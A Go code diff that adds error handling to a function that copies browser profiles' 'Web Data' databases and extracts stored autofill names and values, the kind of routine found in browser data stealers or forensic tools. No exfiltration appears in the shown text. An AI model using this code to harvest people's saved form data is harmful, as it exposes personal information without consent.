@@ -2,6 +2,8 @@ package main
 
 import (
 	"database/sql"
+	"fmt"
+	_ "github.com/mattn/go-sqlite3"
 	"os"
 )
 
@@ -43,15 +45,20 @@ func DecryptAutoFillData(profiles []string) []AutoFill {
 		autoFill := CreateTempFile("Web Data Temp")
 		CopyFile(autoFillPath, autoFill)
 
-		db, _ := sql.Open("sqlite3", autoFill.Name())
-		defer func(db *sql.DB) {
-			_ = db.Close()
-		}(db)
+		db, err := sql.Open("sqlite3", autoFill.Name())
+		if err != nil {
+			fmt.Println("Error opening database:", err)
+			return autoFillArray
+		}
+		defer db.Close()
+
+		// Check if the connection is successful
+		if err := db.Ping(); err != nil {
+			fmt.Println("Error connecting to the database:", err)
+			return autoFillArray
+		}
 
 		rows, _ := db.Query("SELECT name, value, date_created, date_last_used, count FROM autofill")
-		defer func(rows *sql.Rows) {
-			_ = rows.Close()
-		}(rows)
 
 		for rows.Next() {
 			var name string
@@ -70,6 +77,8 @@ func DecryptAutoFillData(profiles []string) []AutoFill {
 				Count:        count,
 			})
 		}
+
+		_ = db.Close()
 
 		CloseFile(autoFill)
 		_ = os.Remove(autoFill.Name())
